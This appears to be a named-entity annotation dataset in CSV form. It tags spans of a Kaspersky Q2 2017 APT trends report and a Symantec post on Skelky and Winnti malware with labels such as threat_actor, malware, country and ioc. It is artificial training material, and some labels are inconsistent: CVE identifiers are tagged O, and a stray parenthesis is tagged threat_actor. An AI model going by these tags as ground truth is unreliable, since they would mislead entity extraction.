APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,Turla,threat_actor
APT Trends report Q2 2017," threat
actors.

",O
APT Trends report Q2 2017,March,timestamp
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,April,timestamp
APT Trends report Q2 2017," started off with a bang, with the discovery of three zero-day exploits
being used in-the-wild by ",O
APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,Turla,threat_actor
APT Trends report Q2 2017,: two of these targeted ,O
APT Trends report Q2 2017,Microsoft Office,software
APT Trends report Q2 2017,"’s
Encapsulated PostScript (EPS) and the third being a ",O
APT Trends report Q2 2017,Microsoft Windows,software
APT Trends report Q2 2017," Local Privilege
Escalation (LPE).  ",O
APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017, was discovered utilizing both ,O
APT Trends report Q2 2017,CVE-2017-0262,O
APT Trends report Q2 2017," (an EPS
vulnerability) and ",O
APT Trends report Q2 2017,CVE-2017-0263,O
APT Trends report Q2 2017," (LPE) over the Easter holiday, targeting a swath of
users throughout ",O
APT Trends report Q2 2017,Europe,country
APT Trends report Q2 2017,".  Prior to this attack, ",O
APT Trends report Q2 2017,Turla,threat_actor
APT Trends report Q2 2017, was also discovered using ,O
APT Trends report Q2 2017,CVE-2017-0261,O
APT Trends report Q2 2017," (a different EPS vulnerability).  Neither actor appeared to deviate from
their usual payload repertoire, with ",O
APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017, dropping their typical ,O
APT Trends report Q2 2017,GAMEFISH,malware
APT Trends report Q2 2017," payload
and ",O
APT Trends report Q2 2017,Turla,threat_actor
APT Trends report Q2 2017, utilizing what we refer to as ,O
APT Trends report Q2 2017,ICEDCOFFEE,malware
APT Trends report Q2 2017, (a.k.a. ,O
APT Trends report Q2 2017,Shirime,malware
APT Trends report Q2 2017,").  Targeting for
these attacks was also directly within the normal wheelhouse for both actors,
focusing mainly on foreign ministries, governments, and other government-affiliated
organizations.

",O
APT Trends report Q2 2017,GReAT,org
APT Trends report Q2 2017, produced additional reports on ,O
APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,Turla,threat_actor
APT Trends report Q2 2017," beyond those mentioned
above.  In ",O
APT Trends report Q2 2017,April,timestamp
APT Trends report Q2 2017,", we notified customers of two new experimental macro techniques
utilized by ",O
APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017,".  These techniques, while not particularly sophisticated, caught our
attention as they had not been seen before in-the-wild.  The first technique involved
using the built-in ‘",O
APT Trends report Q2 2017,certutil,software
APT Trends report Q2 2017,’ utility in ,O
APT Trends report Q2 2017,Microsoft Windows,software
APT Trends report Q2 2017," to extract a hardcoded payload
within a macro. The second technique involved embedding Base64-encoded payloads
within the EXIF metadata of the malicious documents.  While the targeting for this
new set of activity was again fairly standard, we discovered some noteworthy
targeting against a ",O
APT Trends report Q2 2017,French political party,org
APT Trends report Q2 2017, member prior to the ,O
APT Trends report Q2 2017,2017,timestamp
APT Trends report Q2 2017," elections.  Moving
into ",O
APT Trends report Q2 2017,May,timestamp
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,June,timestamp
APT Trends report Q2 2017,", we wrote two additional reports of interest involving these two
actors: the first was an update on the long running “",O
APT Trends report Q2 2017,Mosquito Turla,malware
APT Trends report Q2 2017,"” campaign
showing the usage of fake ",O
APT Trends report Q2 2017,Adobe Flash,software
APT Trends report Q2 2017," installers and continued targeting of foreign
Ministries. The other documented yet another update on ",O
APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017,’s unique ,O
APT Trends report Q2 2017,Delphi,software
APT Trends report Q2 2017,"
payload we call ‘",O
APT Trends report Q2 2017,Zebrocy,malware
APT Trends report Q2 2017,"’.

",O
APT Trends report Q2 2017,June,timestamp
APT Trends report Q2 2017, saw the massive outbreak of a piece of malware dubbed “,O
APT Trends report Q2 2017,ExPetr,malware
APT Trends report Q2 2017,"”.  While initial
assessments presumed that this was yet another ransomware attack à la ",O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017,", a
deeper assessment by ",O
APT Trends report Q2 2017,GReAT,org
APT Trends report Q2 2017," places the initial intent as constituting an operation
destructive in nature.  We were also able to confidently identify the initial distribution
of the malware, as well as indicate a low confidence assessment that the attacks may
share traits with the ",O
APT Trends report Q2 2017,BlackEnergy,malware
APT Trends report Q2 2017," actors. 

2/8

https://securelist.com/schroedingers-petya/78870/


Below is a summary of report titles produced for the Eastern European region only. 
As stated above, if you would like to learn more about our threat intelligence
products or request more information on a specific report, please direct inquiries to
intelreports@kaspersky.com.

1. ",O
APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017," Dabbling in New Macro Techniques
2. ",O
APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017," Using Two Zero Days in Recent Targeted Attacks – early warning
3. ",O
APT Trends report Q2 2017,Turla,threat_actor
APT Trends report Q2 2017," EPS Zero Day – early warning
4. ",O
APT Trends report Q2 2017,Mosquito Turla,malware
APT Trends report Q2 2017," Targets Foreign Affairs Globally
5. Update on ",O
APT Trends report Q2 2017,Zebrocy,malware
APT Trends report Q2 2017, Activity ,O
APT Trends report Q2 2017,June 2017,timestamp
APT Trends report Q2 2017,"
6. ",O
APT Trends report Q2 2017,ExPetr,malware
APT Trends report Q2 2017," motivation and attribution – Early alert
7. ",O
APT Trends report Q2 2017,BlackBox,attack_pattern
APT Trends report Q2 2017," ATM attacks using SDC bus injection

English-Speaking Actors

English-speaking actors are always particularly fascinating due to their history of
complex tooling and campaigns. Actors like ",O
APT Trends report Q2 2017,Regin,threat_actor
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,Project Sauron,threat_actor
APT Trends report Q2 2017," have proven
fascinating examples of new techniques leveraged in long-lasting, hard to catch
campaigns and as such make ideal subjects for further research. Not to be outdone,
",O
APT Trends report Q2 2017,Equation,threat_actor
APT Trends report Q2 2017, and the ,O
APT Trends report Q2 2017,Lamberts,threat_actor
APT Trends report Q2 2017," were the subjects of our most recent investigations.

Continuing our practice of conducting malware paleontology while integrating new
discoveries, we published a report on ",O
APT Trends report Q2 2017,EQUATIONVECTOR,malware
APT Trends report Q2 2017,", an ",O
APT Trends report Q2 2017,Equation,threat_actor
APT Trends report Q2 2017," backdoor first
used ",O
APT Trends report Q2 2017,as early as 2006,timestamp
APT Trends report Q2 2017,". This backdoor is a fascinating passive-active shellcode staging
implant. It’s one of the earliest noted instances of a ",O
APT Trends report Q2 2017,NObody But US,malware
APT Trends report Q2 2017, (‘,O
APT Trends report Q2 2017,NOBUS,malware
APT Trends report Q2 2017,"’)
backdoor for staging further attacks. Despite its age, the ",O
APT Trends report Q2 2017,EQUATIONVECTOR,malware
APT Trends report Q2 2017," backdoor
(identified as ‘",O
APT Trends report Q2 2017,PeddleCheap,malware
APT Trends report Q2 2017,’ in the latest ,O
APT Trends report Q2 2017,ShadowBrokers,threat_actor
APT Trends report Q2 2017," disclosures) incorporates
many advanced techniques for prolonged stealthy operations in victim networks,
allowing the ",O
APT Trends report Q2 2017,Equation,threat_actor
APT Trends report Q2 2017," operators to deliver further payloads without arousing
suspicion. The report tracks the development of these tools through subsequent
iterations year-by-year.

3/8



Our tracking of the ",O
APT Trends report Q2 2017,LAMBERTS,threat_actor
APT Trends report Q2 2017, toolkit continues with the publication of the ,O
APT Trends report Q2 2017,Gray Lambert,malware
APT Trends report Q2 2017, report in ,O
APT Trends report Q2 2017,June,timestamp
APT Trends report Q2 2017,", the most advanced ",O
APT Trends report Q2 2017,Lambert,malware
APT Trends report Q2 2017," known to date. This too is a
",O
APT Trends report Q2 2017,NOBUS,malware
APT Trends report Q2 2017," backdoor, a passive implant operating strictly in user-land. The intricate
usefulness of ",O
APT Trends report Q2 2017,Gray Lambert,malware
APT Trends report Q2 2017," lies in its ability to orchestrate multiple sniffer victims on
a network via broadcast, multicast, and unicast commands, allowing the operators to
employ surgical precision in networks with many infected machines. The sniffers
double as next-stage payload delivery mechanisms for an infected network. A notable
feature of the Lambert campaigns is the level of precision with which targets are
chosen; ",O
APT Trends report Q2 2017,Gray Lambert,malware
APT Trends report Q2 2017,’s victimology is primarily focused on strategic verticals in ,O
APT Trends report Q2 2017,ASIA,country
APT Trends report Q2 2017,"
and ",O
APT Trends report Q2 2017,Middle East,country
APT Trends report Q2 2017,". During this investigation, ",O
APT Trends report Q2 2017,GReAT,org
APT Trends report Q2 2017," researchers have also discovered
two additional ",O
APT Trends report Q2 2017,Lambert,threat_actor
APT Trends report Q2 2017, families (,threat_actor
APT Trends report Q2 2017,Red Lambert,malware
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,Brown Lambert,malware
APT Trends report Q2 2017,") currently under
investigation for Q3.  Below is a list of report titles for reference:

1. ",O
APT Trends report Q2 2017,EQUATIONVECTOR,malware
APT Trends report Q2 2017, – A Generational Breakdown of the ,O
APT Trends report Q2 2017,PeddleCheap,malware
APT Trends report Q2 2017,"
Multifunctional Backdoor

2. The ",O
APT Trends report Q2 2017,Gray Lambert,malware
APT Trends report Q2 2017, – A Leap in Sophistication to User-land ,O
APT Trends report Q2 2017,NOBUS,malware
APT Trends report Q2 2017," Passive
Implants

Korean-speaking Actors

Our researchers focusing on attacks with a Korean nexus also had a very busy
quarter, producing seven reports on the ",O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017, group and ,O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017," attacks.  Most
of the reports on ",O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017, directly involved a sub-group we refer to as ,O
APT Trends report Q2 2017,BlueNoroff,threat_actor
APT Trends report Q2 2017,". 
They are the arm that focuses mainly on financial gain, targeting banks, ATMs, and
other “money-makers”.  We revealed to customers a previously unknown piece of
malware dubbed ‘",O
APT Trends report Q2 2017,Manuscrypt,malware
APT Trends report Q2 2017,’ used by ,O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017," to target not only diplomatic targets in
",O
APT Trends report Q2 2017,South Korea,country
APT Trends report Q2 2017,", but also people using virtual currency and electronic payment sites.
Most recently, ‘",O
APT Trends report Q2 2017,Manuscrypt,malware
APT Trends report Q2 2017,"’ has become the primary backdoor used by the
",O
APT Trends report Q2 2017,BlueNoroff,threat_actor
APT Trends report Q2 2017," sub-group to target financial institutions.

",O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017," also created quite a stir in the second quarter, with our analysts producing
three reports and multiple blog posts on this emerging threat.  What proved most
interesting to us, was the probable linkage to ",O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017," group as the source of the
attacks, as well as the origins of the malware.  ",O
APT Trends report Q2 2017,GReAT,org
APT Trends report Q2 2017," researchers were able to trace
back some of its earliest usage and show that before the ‘",O
APT Trends report Q2 2017,EternalBlue,malware
APT Trends report Q2 2017,"’ exploit was
added to version 2, ",O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017," v1 was used in spearphishing attacks months prior. 
Here is a listing of our reports from Q2 on actors with a Korean nexus:

1. ",O
APT Trends report Q2 2017,Manuscrypt,malware
APT Trends report Q2 2017, – malware family distributed by ,O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017,"
2. ",O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017," actor targets carders
3. ",O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017,-linked ATM Malware On the Loose In ,O
APT Trends report Q2 2017,South Korea,country
APT Trends report Q2 2017,"
4. ",O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017," targets electronic currency operators
5. ",O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017," – major ransomware attack hitting businesses worldwide – early alert
6. ",O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017, possibly tied to the ,O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017, ,O
APT Trends report Q2 2017,APT Group,threat_actor
APT Trends report Q2 2017,"
7. The First ",O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017, ,O
APT Trends report Q2 2017,Spearphish,technique
APT Trends report Q2 2017," and Module Distribution

Middle Eastern Actors
4/8



While there wasn’t much high-end activity involving Middle Eastern actors, we did
produce two reports revolving around the use of a zero-day exploit (",O
APT Trends report Q2 2017,CVE-2017-0199,O
APT Trends report Q2 2017,"). 
The most notable involved an actor we refer to as ",O
APT Trends report Q2 2017,BlackOasis,threat_actor
APT Trends report Q2 2017," and their usage of the
exploit in-the-wild prior to its discovery.  We have previously reported on ",O
APT Trends report Q2 2017,BlackOasis,threat_actor
APT Trends report Q2 2017,"
using other zero-days in the past; ",O
APT Trends report Q2 2017,CVE-2016-4117,O
APT Trends report Q2 2017, in ,O
APT Trends report Q2 2017,May 2016,timestamp
APT Trends report Q2 2017,", ",O
APT Trends report Q2 2017,CVE-2016-0984,O
APT Trends report Q2 2017, in ,O
APT Trends report Q2 2017,June 2015,timestamp
APT Trends report Q2 2017,", and ",O
APT Trends report Q2 2017,CVE-2015-5119,O
APT Trends report Q2 2017, in ,O
APT Trends report Q2 2017,June 2015,timestamp
APT Trends report Q2 2017,.  It is believed that ,O
APT Trends report Q2 2017,BlackOasis,threat_actor
APT Trends report Q2 2017," is a customer of
",O
APT Trends report Q2 2017,Gamma Group,org
APT Trends report Q2 2017, and utilizes the popular ‘lawful surveillance’ kit ,O
APT Trends report Q2 2017,FinSpy,malware
APT Trends report Q2 2017,".  Other than the
usage of the exploit, this report was significant because it also showed one of the
earliest known uses of a new version of ",O
APT Trends report Q2 2017,FinSpy,malware
APT Trends report Q2 2017,", which is still being analyzed by our
researchers.

After the discovery of ",O
APT Trends report Q2 2017,CVE-2017-0199,O
APT Trends report Q2 2017,", a plethora of threat actors also began to
leverage this exploit in their attacks.  We reported to customers on the usage of this
exploit by a well-known Middle Eastern actor dubbed ‘",O
APT Trends report Q2 2017,OilRig,threat_actor
APT Trends report Q2 2017,’.  ,O
APT Trends report Q2 2017,OilRig,threat_actor
APT Trends report Q2 2017," has actively
targeted many organizations in ",O
APT Trends report Q2 2017,Israel,country
APT Trends report Q2 2017," with the exploit via spearphishes appearing to
originate from well-known doctors within Ben Gurion University.  While their
execution was less than stellar, it highlighted the widespread usage of this exploit
shortly after its discovery.

1. ",O
APT Trends report Q2 2017,OilRig,threat_actor
APT Trends report Q2 2017, exploiting ,O
APT Trends report Q2 2017,CVE-2017-0199,O
APT Trends report Q2 2017," in new campaign
2. ",O
APT Trends report Q2 2017,BlackOasis,threat_actor
APT Trends report Q2 2017," using Ole2Link zero day exploit in the wild

Chinese-Speaking Actors

On the Chinese speaking front, we felt it necessary to produce two reports to our
customers.  While Chinese speaking actors are active on a daily basis, not much has
changed and we prefer to avoid producing reports on ‘yet another instance of APTxx’
for the sake of padding our numbers.  Instead we try to focus on new and exciting
campaigns that warrant special attention.

One of those reports detailed a new finding regarding a fileless version of the well-
known ‘",O
APT Trends report Q2 2017,HiKit,malware
APT Trends report Q2 2017,’ malware dubbed ‘,O
APT Trends report Q2 2017,Hias,malware
APT Trends report Q2 2017,’.  We have reported on ,O
APT Trends report Q2 2017,Hias,malware
APT Trends report Q2 2017," in the past, and one
of our researchers was finally able to discover the persistence mechanism used,
which also allowed us to tie the activity to an actor we call ‘",O
APT Trends report Q2 2017,CloudComputating,threat_actor
APT Trends report Q2 2017,"’.

Another report detailed a new campaign we referred to as ‘",O
APT Trends report Q2 2017,IndigoZebra,campaign
APT Trends report Q2 2017,"’.  This
campaign was targeting former Soviet Republics with a wide swath of malware
including ",O
APT Trends report Q2 2017,Meterpreter,malware
APT Trends report Q2 2017,", ",O
APT Trends report Q2 2017,Poison Ivy,malware
APT Trends report Q2 2017,", ",O
APT Trends report Q2 2017,xDown,malware
APT Trends report Q2 2017,", and a previously unknown malware called
‘",O
APT Trends report Q2 2017,xCaon,malware
APT Trends report Q2 2017,"’.  This campaign shares ties with other well-known Chinese-speaking actors,
but no definitive attribution has been made at this time.

1. Updated technical analysis of ",O
APT Trends report Q2 2017,Hias RAT,malware
APT Trends report Q2 2017,"
2. ",O
APT Trends report Q2 2017,IndigoZebra,campaign
APT Trends report Q2 2017, – Intelligence preparation to high-level summits in ,O
APT Trends report Q2 2017,Middle Asia,country
APT Trends report Q2 2017,"

Best of the rest

5/8



Sometimes we find new and exciting campaigns or entirely new threat actors to
report to our subscribers without being able to make an immediate or definitive
determination on regional provenance.  Several reports fell into this category in the
last quarter.  ChasingAdder is a report describing a new persistence technique that
hijacked a legitimate WMI DLL for the purposes of loading a malicious payload. This
activity targeted high-profile diplomatic, military, and research organizations
beginning in the ",O
APT Trends report Q2 2017,fall of 2016,timestamp
APT Trends report Q2 2017,", but to date we have not been able to pinpoint the
specific actor responsible.

",O
APT Trends report Q2 2017,Demsty,malware
APT Trends report Q2 2017, is a new piece of ,O
APT Trends report Q2 2017,MacOS,software
APT Trends report Q2 2017," malware that is targeting University researchers in
",O
APT Trends report Q2 2017,Hong Kong,country
APT Trends report Q2 2017,", among others.  At the time of writing, we have a low confidence
assessment that the campaign was conducted by Chinese-speaking actors, and thus
categorize this as ‘Unknown’ until greater evidence comes to light.

",O
APT Trends report Q2 2017,During Q2,timestamp
APT Trends report Q2 2017,", the mischievous ",O
APT Trends report Q2 2017,ShadowBrokers,threat_actor
APT Trends report Q2 2017," also continued their regular activities
dumping multiple tools and documentation allegedly stolen from ",O
APT Trends report Q2 2017,Equation Group,threat_actor
APT Trends report Q2 2017,". In
",O
APT Trends report Q2 2017,April,timestamp
APT Trends report Q2 2017,", the ",O
APT Trends report Q2 2017,ShadowBrokers,threat_actor
APT Trends report Q2 2017," released another dump of information detailing the alleged
targeting of ",O
APT Trends report Q2 2017,SWIFT,software
APT Trends report Q2 2017, service bureaus and other ,O
APT Trends report Q2 2017,banks,industry
APT Trends report Q2 2017, by ,O
APT Trends report Q2 2017,Equation Group,threat_actor
APT Trends report Q2 2017,".  Since some
of our customers are financial entities, we found it necessary to evaluate the data and
provide an expert’s opinion on the validity of the dump.

Reports in the ‘unknown’ category:

1. ",O
APT Trends report Q2 2017,ShadowBrokers,threat_actor
APT Trends report Q2 2017,’ Lost in translation leak – ,O
APT Trends report Q2 2017,SWIFT,software
APT Trends report Q2 2017," attacks analysis
2. ChasingAdder – WMI DLL Hijacking Trojan Targeting High Profile Victims
3. University Researchers Located in ",O
APT Trends report Q2 2017,Hong Kong,country
APT Trends report Q2 2017, Targeted with ,O
APT Trends report Q2 2017,Demsty,malware
APT Trends report Q2 2017,"

Predictions

Based on the trends we’ve seen over the last three months, as well as foreseeable
geopolitical events, we have listed a few predictions for the upcoming quarter (Q3). As
always, this isn’t an exact science and some cases won’t come to fruition. Analyzing
current and future events and combining those with the motivations of known active
actors can help organizations prepare for likely forthcoming activity:

1. Misinformation campaigns will remain a threat to countries with upcoming
elections, specifically ",O
APT Trends report Q2 2017,Germany,country
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,Norway,country
APT Trends report Q2 2017,", as they have been previous targets
for Eastern European based actors.

2. ‘Lawful Surveillance’ tools will continue to be utilized by governments that don’t
have well-established Cyber Operations capabilities, mainly based out of the
",O
APT Trends report Q2 2017,Middle East,country
APT Trends report Q2 2017,. Companies such as ,O
APT Trends report Q2 2017,Gamma Group,org
APT Trends report Q2 2017,", ",O
APT Trends report Q2 2017,Hacking Team,org
APT Trends report Q2 2017,", and ",O
APT Trends report Q2 2017,NSO,org
APT Trends report Q2 2017," will
continue to offer new zero-day exploits to those customers. As prices increase
and exchanges thrive, new organizations and marketplaces will continue
popping up.

3. Destructive malware disguised as ransomware will continue to be a problem. In
the last quarter we’ve seen two instances of this, and with the continued release
of tools / exploits from dumps like ",O
APT Trends report Q2 2017,Vault7,threat_actor
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,ShadowBrokers,threat_actor
APT Trends report Q2 2017,", this is going to
be a new alarming trend to deal with.

6/8



4. In ",O
APT Trends report Q2 2017,CHINA,country
APT Trends report Q2 2017,", the past months have been marked by the dwindling economic
growth, rising tensions with ",O
APT Trends report Q2 2017,North Korea,country
APT Trends report Q2 2017, and the ,O
APT Trends report Q2 2017,US,country
APT Trends report Q2 2017,", and increased exchanges
between South Korean / Japanese / American organizations. In addition to
these, the 19th Party Congress is set to be held in the ",O
APT Trends report Q2 2017,fall of 2017,timestamp
APT Trends report Q2 2017," and according
to multiple public predictions, it is likely that some major changes will happen in
the leadership. It’s possible that these events will have wide regional influences
that could affect the way that threat actors operate in ",O
APT Trends report Q2 2017,ASIA,country
APT Trends report Q2 2017,", both in terms of
targeting and TTPs.

5. Targeting energy-related companies and organizations will be on the rise.
Countries such as ",O
APT Trends report Q2 2017,Norway,country
APT Trends report Q2 2017," may be a top target moving forward given their
control on oil and gas in the region in the buildup to an election. Saudi Arabia
will also top the charts for potential targeting as they have in years past.

6. Lower-tier threat actors continue to increase cyber-espionage efforts and
capabilities both in complexity and size. Expect more activity with varied
technical capabilities coming from lesser known or previously unseen actors.

How to keep yourself protected

One of the biggest problems when it comes to leveraging threat intelligence is judging
the quality of the data and how it can be used for defense. For instance, we may
observe an increase in the number of fileless attacks or attacks in which all IOCs are
unique or specific per victim. In such situations, having not only host-based IOCs, but
also network IOCs and Yara rules that can help identify malware in all cases is very
important.

Another problem comes from the fact that many threat intelligence providers have a
limited world view and their data covers only a small set of threats. It’s easy for an
enterprise to fall into the trap of thinking that ‘actor X’ is not something they need to
worry because their focus has been only certain countries or certain industry sectors;
only to discover later that their ignorance left them blind to those attacks.

As shown by many incidents, but especially by ",O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,ExPetr,malware
APT Trends report Q2 2017,’s ,O
APT Trends report Q2 2017,EternalBlue,malware
APT Trends report Q2 2017,"-
based spreading subroutines, vulnerabilities remain a key approach to infecting
systems. Therefore timely patching is of utmost importance – which, being one of the
most tedious IT maintenance tasks, works much better with good automation.
",O
APT Trends report Q2 2017,Kaspersky Endpoint Security for Business Advanced,software
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,Kaspersky Total Security,software
APT Trends report Q2 2017,"
include Vulnerability & Patch management components, offering convenient tools for
making patching much easier, and much less time-consuming for IT staff.

Given the above, it is highly recommended that prevention (such as endpoint
protection) along with advanced detection capabilities, such as a solution that can
detect all types of anomalies and scrutinize suspicious files at a deeper level, be
present on users’ systems. The ",O
APT Trends report Q2 2017,Kaspersky Anti Targeted Attack,software
APT Trends report Q2 2017, solution (,O
APT Trends report Q2 2017,KATA,software
APT Trends report Q2 2017,")
matches events coming from different infrastructure levels, discerns anomalies and
aggregates them into incidents, while also studying related artifacts in a safe
environment of a sandbox. As with most ",O
APT Trends report Q2 2017,Kaspersky,org
APT Trends report Q2 2017," products, ",O
APT Trends report Q2 2017,KATA,software
APT Trends report Q2 2017," is powered by

7/8



",O
APT Trends report Q2 2017,HuMachine Intelligence,software
APT Trends report Q2 2017,", which is backed by on premise and in lab-running machine
learning processes coupled with real-time analyst expertise and our understanding of
threat intelligence big data.

The best way to prevent attackers from finding and leveraging security holes, is to
eliminate the holes altogether, including those involving improper system
configurations or errors in proprietary applications. For this, ",O
APT Trends report Q2 2017,Kaspersky Penetration Testing and Application Security Assessment,software
APT Trends report Q2 2017," services can become a convenient and
highly effective solution, providing not only data on found vulnerabilities, but also
advising on how to fix it, further strengthening corporate security.

https://youtu.be/JS4tbSWQb90

8/8

https://youtu.be/JS4tbSWQb90

	APT Trends report ",O
APT Trends report Q2 2017,Q2 2017,timestamp
APT Trends report Q2 2017,"
	Introduction
	Russian-Speaking Actors
	English-Speaking Actors
	Korean-speaking Actors
	Middle Eastern Actors
	Chinese-Speaking Actors
	Best of the rest
	Predictions
	How to keep yourself protected",O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky," attackers have a skeleton in their closet?


",O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky," attackers have a skeleton in
their closet?
New evidence suggests that the skeleton key malware, known as ",O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky,", could be linked to the
",O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky," malware family.
By: ",O
BackdoorWinnti_TrojanSkelky,Gavin O Gorman,identity
BackdoorWinnti_TrojanSkelky, ,O
BackdoorWinnti_TrojanSkelky,Symantec,org
BackdoorWinnti_TrojanSkelky," Employee
Created ",O
BackdoorWinnti_TrojanSkelky,29 Jan 2015,timestamp
BackdoorWinnti_TrojanSkelky,"

Contributor: ",O
BackdoorWinnti_TrojanSkelky,Nikolas Tsapkis,identity
BackdoorWinnti_TrojanSkelky,"

On ",O
BackdoorWinnti_TrojanSkelky,"January 12, 2015",timestamp
BackdoorWinnti_TrojanSkelky,", ",O
BackdoorWinnti_TrojanSkelky,Dell,org
BackdoorWinnti_TrojanSkelky, Secureworks blogged about a tool (,O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky,") that allows attackers to
â€œuse a password of their choosing to authenticate as any user.â€ The ",O
BackdoorWinnti_TrojanSkelky,Skelky,malware
BackdoorWinnti_TrojanSkelky," (from skeleton key)
tool is deployed when an attacker gains access to a victimâ€™s network; the attackers may also
utilize other tools and elements in their attack. 

Symantec has analyzed ",O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky, and found that it may be linked to the ,O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky,"
malware family. The attackers behind the ",O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky," campaign appear to have been using the
malware in conjunction with this back door threat. Itâ€™s unclear if the malware family
",O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky," is used by one attack group or many groups.

During our research, we also found that ",O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky," has been active over the past two years. Within
this timeframe, we have seen new variants and a consistent hashed password value.

Where is ",O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky," being used?

1 of 3



",O
BackdoorWinnti_TrojanSkelky,Symantec,org
BackdoorWinnti_TrojanSkelky," telemetry identified the skeleton key malware on compromised computers in five
organizations with offices in the ",O
BackdoorWinnti_TrojanSkelky,United States,country
BackdoorWinnti_TrojanSkelky, and ,O
BackdoorWinnti_TrojanSkelky,Vietnam,country
BackdoorWinnti_TrojanSkelky,". The exact nature and names of the
affected organizations is unknown to ",O
BackdoorWinnti_TrojanSkelky,Symantec,org
BackdoorWinnti_TrojanSkelky,. The first activity was seen in ,O
BackdoorWinnti_TrojanSkelky,January 2013,timestamp
BackdoorWinnti_TrojanSkelky, and ,O
BackdoorWinnti_TrojanSkelky,until November 2013,timestamp
BackdoorWinnti_TrojanSkelky,", there was no further activity involving the skeleton key malware.
",O
BackdoorWinnti_TrojanSkelky,In November 2013,timestamp
BackdoorWinnti_TrojanSkelky,", the attackers increased their usage of the tool and have been active ever since. Four more
variants of ",O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky," were discovered as well as additional file names used by the attackers. The
complete set of observed file names and hashes are listed as follows

",O
BackdoorWinnti_TrojanSkelky,msuta64.dll,ioc
BackdoorWinnti_TrojanSkelky,: ,O
BackdoorWinnti_TrojanSkelky,66da7ed621149975f6e643b4f9886cfd,ioc
BackdoorWinnti_TrojanSkelky,"
",O
BackdoorWinnti_TrojanSkelky,ole64.dll,ioc
BackdoorWinnti_TrojanSkelky,: ,O
BackdoorWinnti_TrojanSkelky,bf45086e6334f647fda33576e2a05826,ioc
BackdoorWinnti_TrojanSkelky,"    
",O
BackdoorWinnti_TrojanSkelky,HookDC64.dll,ioc
BackdoorWinnti_TrojanSkelky,: ,O
BackdoorWinnti_TrojanSkelky,bf45086e6334f647fda33576e2a05826,ioc
BackdoorWinnti_TrojanSkelky,"    
",O
BackdoorWinnti_TrojanSkelky,HookDC.dll,ioc
BackdoorWinnti_TrojanSkelky,: ,O
BackdoorWinnti_TrojanSkelky,a487f1668390df0f4951b7292bae6ecf,ioc
BackdoorWinnti_TrojanSkelky,"    
",O
BackdoorWinnti_TrojanSkelky,HookDC.dll,ioc
BackdoorWinnti_TrojanSkelky,: ,O
BackdoorWinnti_TrojanSkelky,8ba4df29b0593be172ff5678d8a05bb3,ioc
BackdoorWinnti_TrojanSkelky,"    
",O
BackdoorWinnti_TrojanSkelky,HookDC.dll,ioc
BackdoorWinnti_TrojanSkelky,: ,O
BackdoorWinnti_TrojanSkelky,f01026e1107b722435126c53b2af47a9,ioc
BackdoorWinnti_TrojanSkelky,"    
",O
BackdoorWinnti_TrojanSkelky,ole64.dll,ioc
BackdoorWinnti_TrojanSkelky,: ,O
BackdoorWinnti_TrojanSkelky,f01026e1107b722435126c53b2af47a9,ioc
BackdoorWinnti_TrojanSkelky,"    
",O
BackdoorWinnti_TrojanSkelky,olex64.dll,ioc
BackdoorWinnti_TrojanSkelky,: ,O
BackdoorWinnti_TrojanSkelky,f01026e1107b722435126c53b2af47a9,ioc
BackdoorWinnti_TrojanSkelky,"    
",O
